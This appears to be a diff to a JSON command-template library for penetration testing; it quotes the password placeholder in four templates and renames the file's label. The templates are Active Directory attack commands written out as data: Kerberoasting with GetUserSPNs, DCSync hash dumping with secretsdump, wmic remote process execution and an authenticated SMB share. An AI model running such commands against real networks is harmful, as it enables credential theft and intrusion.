@@ -1,7 +1,7 @@
 {
   "version": "1.0",
-  "label": "pentest",
-  "updatedDate": "2026.05.05",
+  "label": "advanced",
+  "updatedDate": "2026.05.07",
   "categories": [
     {
       "id": "recon",
@@ -1314,7 +1314,7 @@
           "group": "File Transfer / Serve",
           "name": "SMB with auth",
           "description": "SMB with auth command from the Serve section.",
-          "template": "impacket-smbserver share $(pwd) -smb2support -username {USER} -password {PASS}"
+          "template": "impacket-smbserver share $(pwd) -smb2support -username {USER} -password '{PASS}'"
         },
         {
           "id": "transfer-010",
@@ -2330,7 +2330,7 @@
           "group": "Core AD",
           "name": "Kerberoast — GetUserSPNs",
           "description": "Crackable TGS for SPN-bearing users.",
-          "template": "impacket-GetUserSPNs {DOMAIN}/{USER}:{PASS} -dc-ip {RHOST} -request -outputfile tgs.txt"
+          "template": "impacket-GetUserSPNs {DOMAIN}/{USER}:'{PASS}' -dc-ip {RHOST} -request -outputfile tgs.txt"
         },
         {
           "id": "ad-004",
@@ -2351,7 +2351,7 @@
           "group": "Core AD",
           "name": "DCSync — secretsdump",
           "description": "Dump NTDS hashes once you have replication rights.",
-          "template": "impacket-secretsdump {DOMAIN}/{USER}:{PASS}@{RHOST} -just-dc"
+          "template": "impacket-secretsdump {DOMAIN}/{USER}:'{PASS}'@{RHOST} -just-dc"
         },
         {
           "id": "ad-007",
@@ -3283,7 +3283,7 @@
           "group": "LOLBins",
           "name": "wmic remote exec",
           "description": "Create a remote process through WMIC with supplied credentials.",
-          "template": "wmic /node:{RHOST} /user:{USER} /password:{PASS} process call create 'cmd /c whoami'"
+          "template": "wmic /node:{RHOST} /user:{USER} /password:'{PASS}' process call create 'cmd /c whoami'"
         },
         {
           "id": "evasion-010",
